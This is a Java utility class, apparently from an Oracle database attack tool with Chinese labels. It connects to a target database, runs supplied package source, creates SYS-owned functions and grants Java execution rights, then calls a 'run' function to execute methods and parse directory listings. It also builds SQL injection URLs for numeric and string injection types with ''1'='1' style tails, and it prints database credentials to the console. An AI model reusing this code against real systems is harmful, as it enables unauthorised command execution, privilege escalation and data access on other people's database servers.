
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.sql.CallableStatement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Utils {
    public static Connection globalConn;
    public static String globalEncoding = "GBK";
    public static String globalMode = "普通";
    public static String globalInjectType = "数值型";

    public Utils() {
    }

    public static void initConnection(String host, String port, String user, String pass, String sid) throws Exception {
        if (globalConn != null) {
            try {
                globalConn.close();
            } catch (SQLException var6) {
                var6.printStackTrace();
            }
        }

        globalConn = null;
        Class.forName("oracle.jdbc.driver.OracleDriver");
        String url = "jdbc:oracle:thin:@%s:%s/%s";
        url = String.format(url, host, port, sid);
        System.out.println(url + "/" + user + ":" + pass);
        globalConn = DriverManager.getConnection(url, user, pass);
    }

    public static String createPackage(String sourceCode) {
        String result = "^OK^";
        CallableStatement cs = null;

        try {
            cs = globalConn.prepareCall(sourceCode);
            System.out.println(cs.execute());
        } catch (Exception var12) {
            var12.printStackTrace();
            result = var12.getMessage();
        } finally {
            if (cs != null) {
                try {
                    cs.close();
                } catch (SQLException var11) {
                    var11.printStackTrace();
                }
            }

        }

        return result;
    }

    public static String createSysFunction() {
        String result = "^OK^";
        CallableStatement cs = null;

        try {
            cs = globalConn.prepareCall(SQLConstant.SYS_CREATE_FUNCTION);
            cs.execute();
            cs.close();
            cs = globalConn.prepareCall(SQLConstant.SYS_GRANT_EXEC);
            cs.execute();
        } catch (Exception var11) {
            var11.printStackTrace();
            result = var11.getMessage();
        } finally {
            if (cs != null) {
                try {
                    cs.close();
                } catch (SQLException var10) {
                    var10.printStackTrace();
                }
            }

        }

        return result;
    }

    public static String createFunction() {
        String result = "^OK^";
        CallableStatement cs = null;

        try {
            cs = globalConn.prepareCall(SQLConstant.CREATE_FUNCTION);
            cs.execute();
        } catch (Exception var11) {
            var11.printStackTrace();
            result = var11.getMessage();
        } finally {
            if (cs != null) {
                try {
                    cs.close();
                } catch (SQLException var10) {
                    var10.printStackTrace();
                }
            }

        }

        return result;
    }

    public static String grantJavaExecute() {
        String result = "^OK^";
        CallableStatement cs = null;

        try {
            cs = globalConn.prepareCall(SQLConstant.GRANT_JAVA_EXEC);
            cs.execute();
        } catch (Exception var11) {
            var11.printStackTrace();
            result = var11.getMessage();
        } finally {
            if (cs != null) {
                try {
                    cs.close();
                } catch (SQLException var10) {
                    var10.printStackTrace();
                }
            }

        }

        return result;
    }


    public static String dropJavaSource() {
        String result = "^OK^";
        CallableStatement cs = null;

        try {
            cs = globalConn.prepareCall(SQLConstant.DROP_JAVA_SOURCE);
            cs.execute();
        } catch (Exception var11) {
            var11.printStackTrace();
            result = var11.getMessage();
        } finally {
            if (cs != null) {
                try {
                    cs.close();
                } catch (SQLException var10) {
                    var10.printStackTrace();
                }
            }

        }

        return result;
    }


    private static String callFunction(Connection conn, String owner, String methodName, String params, String encoding) {
        String result = "";
        String callSQLString = "";
        if (owner.equals("SYS")) {
            callSQLString = "select " + owner + ".run" + "(?,?,?) from dual";
        } else {
            callSQLString = "select run(?,?,?) from dual";
        }

        PreparedStatement stat = null;
        ResultSet rs = null;
        try {
            stat = conn.prepareStatement(callSQLString);
            stat.setString(1, methodName);
            stat.setString(2, params);
            stat.setString(3, encoding);
            rs = stat.executeQuery();
            while( rs.next()){
                result = rs.getString(1);
            }
        } catch (Exception var17) {
            var17.printStackTrace();
            result = var17.getMessage();
        } finally {
            if (stat != null) {
                try {
                    stat.close();
                } catch (SQLException var16) {
                    var16.printStackTrace();
                }
            }

        }

        return result;
    }

    public static String callSysFunction(String methodName, String params, String encoding) {
        System.out.println("method:" + methodName + ",params:" + params);
        return callFunction(globalConn, "SYS", methodName, params, encoding);
    }

    public static String callUserFunction(String methodName, String params, String encoding) {
        return callFunction(globalConn, "", methodName, params, encoding);
    }

    public static Map<String, String> parseListLine(String line) {
        Map<String, String> result = new HashMap();
        String[] tmp = line.split(" ");
        result.put("name", tmp[tmp.length - 1]);
        if(line.contains("<DIR>")){
            result.put("type", "D");
        }else{
            result.put("type", "F");
            result.put("size", tmp[1]);
        }
        result.put("lastModifyTime", tmp[0]);
        return result;
    }

    public static List<Map<String, String>> parseListLines(String lines) {
        List<Map<String, String>> result = new ArrayList();
        String[] var5;
		var5 = lines.split("\n");
        int var4 = var5.length;

        for(int var3 = 0; var3 < var4; ++var3) {
            String line = var5[var3];
            line = line.trim();
			System.out.println(line);
            result.add( parseListLine(line));
        }

        return result;
    }

    public static int getURL(String urlString) throws Exception {

        URL url = new URL(urlString);
        HttpURLConnection urlcon = (HttpURLConnection)url.openConnection();
        urlcon.setRequestProperty("Content-Type", "text/xml; charset=GB2312");
        urlcon.connect();
        int result = urlcon.getResponseCode();
        return result;
    }

    public static String parseUrlByType(String url, String payload, String injectType) {
        String result = "";
        if (injectType.equals("数值型")) {
            result = url + "+" + URLEncoder.encode(payload);
        } else if (injectType.equals("字符型")) {
            result = url + "'+" + URLEncoder.encode(payload) + "+and+'1'='1";
        } else {
            result = url + "'+" + URLEncoder.encode(payload) + "+and+'1'+like+'%251";
        }

        return result;
    }



}
